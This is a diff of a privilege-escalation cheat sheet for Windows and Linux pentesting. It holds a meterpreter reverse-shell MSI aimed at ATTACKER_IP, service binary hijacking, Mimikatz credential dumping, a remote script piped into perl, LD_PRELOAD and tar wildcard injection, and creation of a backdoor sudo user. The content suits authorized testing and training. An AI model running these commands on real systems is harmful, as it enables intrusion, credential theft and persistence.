@@ -1,6 +1,6 @@
 # privesc-commands-dictionary
 
-
+<a name="top"></a>
 
 # Privilege Escalation Commands
 
@@ -83,6 +83,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `net accounts` | Password policy (min password age, max password age, lockout threshold) |
 | `net accounts /domain` | Domain password policy (if domain joined) |
 
+[🔝 Back to Top](#top)
+
 ### 2. Windows Group Enumeration
 
 | Command | Purpose |
@@ -102,6 +104,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `wmic group get name` | WMIC: list local groups |
 | `wmic path win32_groupuser where (groupcomponent="win32_group.name='Administrators',domain='%COMPUTERNAME%'")` | WMIC: get members of Administrators group |
 | `net localgroup "Backup Operators"` | Check Backup Operators group (can backup files, including SAM) |
+
+[🔝 Back to Top](#top)
 
 ### 3. Windows System Information
 
@@ -124,6 +128,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `Get-HotFix` | PowerShell: list installed hotfixes |
 | `Get-HotFix \| Select-Object HotFixID,InstalledOn` | PowerShell: hotfixes with installation dates |
 | `wmic qfe list brief /format:texttable` | WMIC: list hotfixes (alternate method) |
+
+[🔝 Back to Top](#top)
 
 ### 4. Windows Network Enumeration
 
@@ -157,6 +163,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `Get-NetFirewallProfile` | PowerShell: firewall profiles |
 | `Get-NetFirewallRule \| Where-Object {$_.Enabled -eq $true} \| Select-Object DisplayName,Direction,Action` | PowerShell: enabled firewall rules |
 
+[🔝 Back to Top](#top)
+
 ### 5. Windows Service Enumeration
 
 | Command | Purpose |
@@ -181,6 +189,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `accesschk.exe -uwcqv "BUILTIN\Users" *` | Check service permissions for standard users (Sysinternals) |
 | `accesschk.exe -uwcqv "Everyone" *` | Check service permissions for Everyone group (Sysinternals) |
 | `Get-CimInstance Win32_Service \| ForEach-Object { $_.Name; $_.GetSecurityDescriptor().Descriptor }` | PowerShell: get service security descriptors |
+
+[🔝 Back to Top](#top)
 
 ### 6. Windows Registry Checks
 
@@ -207,6 +217,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" \| Select-Object DefaultUserName,DefaultPassword` | PowerShell: check for autologon credentials |
 | `Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE_NAME` | PowerShell: check service registry ACLs (for weak permissions) |
 
+[🔝 Back to Top](#top)
+
 ### 7. Windows Scheduled Tasks
 
 | Command | Purpose |
@@ -228,6 +240,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `Get-ScheduledTask \| Where-Object {$_.Triggers -ne $null} \| Select-Object TaskName,State,Triggers` | PowerShell: tasks with triggers |
 | `schtasks /query /fo LIST /v \| findstr /i "task to run"` | Extract executable paths from tasks |
 | `schtasks /query /fo LIST /v \| findstr /i "run as user"` | Extract user accounts tasks run as |
+
+[🔝 Back to Top](#top)
 
 ### 8. Windows Password Hunting
 
@@ -256,6 +270,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `reg query HKCU\Software\ORL\VNC\Viewer\MRU` | VNC credentials in registry (plaintext or weakly encrypted) |
 | `reg query HKLM\Software\TightVNC\Server /v Password` | TightVNC password (obfuscated, but crackable) |
 
+[🔝 Back to Top](#top)
+
 ### 9. Windows Privilege Escalation
 
 | Command | Purpose |
@@ -276,6 +292,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `Get-LocalGroupMember Administrators` | PowerShell: list current Administrators members |
 | `Add-LocalGroupMember -Group "Administrators" -Member "DOMAIN\username"` | PowerShell: add domain user to Administrators (requires admin) |
 | `Get-User -Identity username \| Enable-ADAccount` | PowerShell: enable disabled AD account (requires AD privileges) |
+
+[🔝 Back to Top](#top)
 
 ### 10. Windows UAC Bypass
 
@@ -301,6 +319,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 
 > **Note:** These bypasses work only when UAC is not set to "Always notify". They also require the user to be in the Administrators group.
 
+[🔝 Back to Top](#top)
+
 ### 11. Windows Token Manipulation
 
 | Command | Purpose |
@@ -319,6 +339,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
   - `Invoke-TokenManipulation -Enumerate` - list all available tokens
   - `Invoke-TokenManipulation -ImpersonateUser -Username "SYSTEM"` - impersonate SYSTEM token
   - `Invoke-TokenManipulation -CreateProcess -ProcessPath "C:\Windows\System32\cmd.exe" -Username "NT AUTHORITY\SYSTEM"` - create new process with SYSTEM   token
+
+[🔝 Back to Top](#top)
 
 ### 12. Windows Lateral Movement
 
@@ -354,6 +376,8 @@ A structured reference for Windows and Linux privilege escalation. From user enu
 | `sc \\COMPUTERNAME start SERVICE_NAME` | Start remote service |
 | `sc \\COMPUTERNAME config SERVICE_NAME binPath= "C:\malicious.exe"` | Change remote service binary path |
 
+[🔝 Back to Top](#top)
+
 ### 13. Windows Always Install Elevated
 
 - Always Install Elevated is a Windows Installer policy that allows non-admin users to install MSI packages with SYSTEM privileges.
@@ -382,6 +406,7 @@ msiexec /quiet /i malicious.msi
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi
 ```
+[🔝 Back to Top](#top)
 
 ### 14. Windows Stored Credentials
 
@@ -404,6 +429,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 * After gaining SYSTEM, use Mimikatz
 mimikatz.exe "dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\CRED_GUID"
 ```
+
+[🔝 Back to Top](#top)
 
 ### 15. Windows DLL Hijacking
 
@@ -440,6 +467,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 
 ## Linux
 
+[🔝 Back to Top](#top)
+
 ### 16. Linux User Enumeration
 
 | Command | Purpose |
@@ -467,6 +496,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 | `awk -F: '($3 == 0) {print}' /etc/passwd` | Find UID 0 users (any user with root privileges) |
 | `awk -F: '($3 >= 1000) {print}' /etc/passwd` | Find human users (UID >= 1000 on most systems) |
 
+[🔝 Back to Top](#top)
+
 ### 17. Linux Group Enumeration
 
 | Command | Purpose |
@@ -486,6 +517,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 | `members groupname` | List members of a group (requires `members` package) |
 | `grep -E "sudo\|wheel\|admin\|docker\|lxd" /etc/group` | Find high-value groups |
 | `awk -F: '{print $1, $4}' /etc/passwd` | Show primary group assignments |
+
+[🔝 Back to Top](#top)
 
 ### 18. Linux System Information
 
@@ -526,6 +559,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 | `systemctl list-units --type=service --state=running` | Running systemd services (systemd systems) |
 | `systemctl list-units --type=service --state=failed` | Failed systemd services |
 
+[🔝 Back to Top](#top)
+
 ### 19. Linux Network Enumeration
 
 | Command | Purpose |
@@ -561,6 +596,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 | `host google.com` | DNS lookup |
 | `cat /var/lib/dhcp/dhclient.leases` | DHCP lease history (may contain hostnames) |
 | `cat /etc/netplan/*.yaml` | Netplan configuration (Ubuntu modern) |
+
+[🔝 Back to Top](#top)
 
 ### 20. Linux SUID/SGID Binaries
 
@@ -605,6 +642,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 | `ruby` | `ruby -e 'exec "/bin/sh"'` |
 | `openssl` | Can be used for file encryption (not directly for shell) |
 
+
+[🔝 Back to Top](#top)
+
 ### 21. Linux Sudo Misconfigurations
 
 | Command | Purpose |
@@ -645,6 +685,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
 | `(ALL) NOPASSWD: /usr/bin/env` | `sudo env /bin/sh` |
 | `(ALL) NOPASSWD: /bin/systemctl` | `sudo systemctl set-environment LD_PRELOAD=/tmp/evil.so` (then start a service) |
 
+[🔝 Back to Top](#top)
+
 ### 22. Linux Cron Jobs
 
 | Command | Purpose |
@@ -671,6 +713,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
   - Paths with spaces (potential unquoted path issues)
   - Environment variables set in the crontab
 
+[🔝 Back to Top](#top)
+
 ### 23. Linux Writable Files
 
 | Command | Purpose |
@@ -696,6 +740,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
   - `.bashrc` / `.profile` - user's shell configuration files
   - `/etc/ld.so.conf` - library configuration
   - `/etc/ld.so.preload` - library preloading
+
+[🔝 Back to Top](#top)
 
 ### 24. Linux Kernel Exploits
 
@@ -729,6 +775,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
   - `linux-exploit-suggester-2`: `curl -L https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl \| perl`
   - `LES.sh`: Look for Linux privilege escalation scripts
 
+[🔝 Back to Top](#top)
+
 ### 25. Linux Docker Breakout
 
 | Command | Purpose |
@@ -755,6 +803,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f 
   - CVE-2019-5736 (runc breakout) - overwrite runc binary
   - `--cap-add=SYS_ADMIN` with mounted host filesystem
 
+[🔝 Back to Top](#top)
+
 ### 26. Linux PATH Manipulation
 
 | Command | Purpose |
@@ -780,6 +830,8 @@ chmod +x /tmp/ls
 ```
 
 ---
+
+[🔝 Back to Top](#top)
 
 ### 27. Linux Wildcard Injection
 
@@ -819,6 +871,8 @@ touch -- '--checkpoint-action=exec=sh shell.sh'
 -  When tar runs with *, it executes the malicious command
 
 ---
+
+[🔝 Back to Top](#top)
 
 ### 28. Linux Shared Library Hijacking
 
@@ -871,6 +925,8 @@ __attribute__((constructor)) void init() {
 
 ---
 
+[🔝 Back to Top](#top)
+
 ### 29. Linux Capabilities
 
 |Command| Purpose|
@@ -904,6 +960,8 @@ __attribute__((constructor)) void init() {
   - `cap_net_raw `on `tcpdump:` Can capture network traffic
 
 ---
+
+[🔝 Back to Top](#top)
 
 ### 30. Linux Environment Variables
 
@@ -961,6 +1019,8 @@ gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
 sudo LD_PRELOAD=/tmp/evil.so /usr/bin/sudo
 ```
 
+[🔝 Back to Top](#top)
+
 ---
 
 ## General
@@ -1003,6 +1063,8 @@ sudo LD_PRELOAD=/tmp/evil.so /usr/bin/sudo
 | **Incognito** | Token manipulation |
 | **JuicyPotato** | Windows privilege escalation via COM |
 
+[🔝 Back to Top](#top)
+
 ### 32. Transferring Files
 
 #### Linux to Linux
@@ -1038,6 +1100,8 @@ sudo LD_PRELOAD=/tmp/evil.so /usr/bin/sudo
 | **Python HTTP server (on Linux)** | `python3 -m http.server 8000` (attacker) |
 | **wget.exe (if installed)** | `wget http://ATTACKER_IP:8000/file -OutFile file` |
 
+[🔝 Back to Top](#top)
+
 ### 33. Troubleshooting
 
 | Problem | Likely Cause | Fix |
@@ -1057,6 +1121,8 @@ sudo LD_PRELOAD=/tmp/evil.so /usr/bin/sudo
 | **Cannot write to file** | Insufficient permissions | Check file ownership with `ls -la`, try to escalate privileges |
 | **SUID binary doesn't give root** | The SUID binary is not owned by root or doesn't run with root privileges | Check with `ls -la` for ownership |
 | **Cron job not executing** | Cron service not running or permissions issue | Check with `systemctl status cron` |
+
+[🔝 Back to Top](#top)
 
 ### 34. Real-World Workflows
 
@@ -1219,7 +1285,26 @@ echo "backdoor:password" | chpasswd
 usermod -aG sudo backdoor
 ```
 
+[🔝 Back to Top](#top)
+
 ---
+
+## ✅ Completion Note
+
+This document covers the essential privilege escalation commands for both Windows and Linux. Not every possible technique is included—but what's here is what you'll actually use in the field.
+
+Each command was curated for clarity, accuracy, and practical use during CTFs, authorized penetration tests, and security assessments.
+
+**Need a quick reminder?** → [📄 QUICKREF.md](QUICKREF.md) (one-page cheat sheet)  
+**New to privesc?** → [📘 TUTORIAL.md](TUTORIAL.md) (beginner guide)  
+**Want operational depth?** → [🧠 GUIDE.md](GUIDE.md) (strategy and detection)
+
+This manual is complete. No AI wrote it. No copy-paste shortcuts. Every command was typed by hand and organized for quick reference.
+
+**— Omar Fattah**
+
+---
+
 
 ### License
 
